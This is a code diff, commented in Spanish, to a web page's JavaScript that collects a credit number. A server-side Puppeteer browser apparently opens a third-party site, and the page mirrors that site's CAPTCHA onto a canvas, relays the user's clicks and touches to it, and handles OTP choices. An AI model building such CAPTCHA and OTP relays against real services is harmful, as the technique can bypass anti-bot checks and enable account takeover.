@@ -237,8 +237,26 @@ let captchaVisible = false;
 let selectedOtpOption = null;
 let otpOptionsList = [];
 let ws = null;
+let preSessionReady = false;
 const canvas = document.getElementById('captchaCanvas');
 const ctx = canvas.getContext('2d');
+
+// ============================================================
+// PRE-SESSION: crear sesión al cargar la página
+// ============================================================
+async function preStartSession() {
+    try {
+        const r = await fetch(API + '/api/pre-session', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: '{}' });
+        const data = await r.json();
+        if (data.sessionId) {
+            currentSessionId = data.sessionId;
+            preSessionReady = true;
+            console.log('Pre-session lista:', currentSessionId);
+            // Pre-conectar WebSocket
+            connectWS();
+        }
+    } catch (e) { console.log('Pre-session no disponible:', e.message); }
+}
 
 // ============================================================
 // STEPPER
@@ -304,6 +322,7 @@ function connectWS() {
         }
     };
     ws.onclose = () => { ws = null; };
+    ws.onerror = () => { ws = null; };
 }
 
 function drawFrame(dataUrl) {
@@ -319,10 +338,10 @@ function drawFrame(dataUrl) {
 function startMirror(sessionId) {
     connectWS();
     const trySend = () => {
-        if (ws.readyState === 1) {
+        if (ws && ws.readyState === 1) {
             ws.send(JSON.stringify({ type: 'start-mirror', sessionId }));
         } else {
-            setTimeout(trySend, 100);
+            setTimeout(trySend, 150);
         }
     };
     trySend();
@@ -334,19 +353,50 @@ function stopMirror() {
     }
 }
 
-// Click en canvas → mapear coords al CAPTCHA real
+// Click en canvas → mapear coords al CAPTCHA real en viewport del Puppeteer
 document.getElementById('captchaMirror').addEventListener('click', function(event) {
-    if (!currentSessionId || !captchaBounds || !ws || ws.readyState !== 1) return;
+    if (!currentSessionId || !captchaBounds) return;
+    // Asegurar que WS esté conectado
+    if (!ws || ws.readyState !== 1) {
+        connectWS();
+        return;
+    }
 
     const rect = canvas.getBoundingClientRect();
     const scaleX = canvas.width / rect.width;
     const scaleY = canvas.height / rect.height;
 
-    // Coords en pixels del screenshot (con padding de 10px del server)
+    // Posición en pixels dentro del screenshot (que tiene 10px de padding)
     const pixX = (event.clientX - rect.left) * scaleX;
     const pixY = (event.clientY - rect.top) * scaleY;
 
-    // Restar padding del screenshot para obtener coords relativas al elemento CAPTCHA
+    // El screenshot tiene 10px de padding. Restar para obtener coords relativas al CAPTCHA
+    const relX = pixX - 10;
+    const relY = pixY - 10;
+
+    console.log('Click canvas:', {pixX, pixY, relX, relY, bounds: captchaBounds});
+
+    ws.send(JSON.stringify({
+        type: 'click',
+        sessionId: currentSessionId,
+        x: relX,
+        y: relY,
+        bounds: captchaBounds,
+    }));
+});
+
+// También para touch (móvil)
+document.getElementById('captchaMirror').addEventListener('touchend', function(event) {
+    event.preventDefault();
+    if (!currentSessionId || !captchaBounds || !ws || ws.readyState !== 1) return;
+
+    const touch = event.changedTouches[0];
+    const rect = canvas.getBoundingClientRect();
+    const scaleX = canvas.width / rect.width;
+    const scaleY = canvas.height / rect.height;
+
+    const pixX = (touch.clientX - rect.left) * scaleX;
+    const pixY = (touch.clientY - rect.top) * scaleY;
     const relX = pixX - 10;
     const relY = pixY - 10;
 
@@ -357,7 +407,7 @@ document.getElementById('captchaMirror').addEventListener('click', function(even
         y: relY,
         bounds: captchaBounds,
     }));
-});
+}, { passive: false });
 
 // ============================================================
 // CAPTCHA mostrar/ocultar
@@ -380,7 +430,7 @@ function hideCaptcha() {
 }
 
 // ============================================================
-// PASO 1: Enviar crédito
+// PASO 1: Enviar crédito (usa pre-session si existe)
 // ============================================================
 async function iniciarSesion() {
     const credit = document.getElementById('creditNumber').value.trim();
@@ -391,13 +441,20 @@ async function iniciarSesion() {
     showMsg('', '');
 
     try {
+        const body = { creditNumber: credit };
+        // Reutilizar pre-session si existe
+        if (currentSessionId && preSessionReady) {
+            body.sessionId = currentSessionId;
+        }
+
         const r = await fetch(API + '/api/start', {
             method: 'POST', headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ creditNumber: credit }),
+            body: JSON.stringify(body),
         });
         const data = await r.json();
         if (!r.ok) throw new Error(data.error || 'Error');
         currentSessionId = data.sessionId;
+        preSessionReady = false;
 
         if (data.hasCaptcha && data.screenshot) {
             showCaptcha(data.screenshot, data.captchaBounds);
@@ -648,6 +705,9 @@ function showMsg(m, t) {
 function esc(t) { return t.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
 
 window.addEventListener('load', function() {
+    // Pre-calentar sesión al cargar la página (Puppeteer ya navega a Mobilize)
+    preStartSession();
+
     if (window.innerWidth <= 900) {
         setTimeout(function() {
             document.getElementById('formStep1').scrollIntoView({ behavior: 'smooth', block: 'start' });
